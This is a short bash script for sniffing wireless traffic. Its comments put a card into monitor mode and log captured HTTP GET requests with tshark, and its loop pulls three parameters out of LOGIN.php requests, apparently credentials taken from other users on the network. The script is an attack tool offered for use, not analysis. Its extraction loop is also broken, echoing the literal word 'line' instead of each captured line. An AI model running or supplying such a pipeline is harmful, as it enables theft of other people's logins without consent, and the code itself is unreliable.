#!/bin/bash
#FIRST
#=====
#airmon-ng start wlan0 11
#THEN
#=====
#tshark -i wlan0mon -Y "http.request.method == 'GET'" | tee -a sniff.log
#
#VARS & VALUES CAN BE PULLED OUT WITH THE SCRIPT...
#==================================================
#------------------------------
grep LOGIN.php sniff.log | while read line ; do
VAR1=$(echo line | awk -F "ORIG_VAR1=" {'print $2'} | cut -d' ' -f1)
VAR2=$(echo line | awk -F "ORIG_VAR2=" {'print $2'} | cut -d' ' -f1)
VAR3=$(echo line | awk -F "ORIG_VAR3=" {'print $2'} | cut -d' ' -f1)
echo "$VAR1 $VAR2 $VAR3"
done
#------------------------------
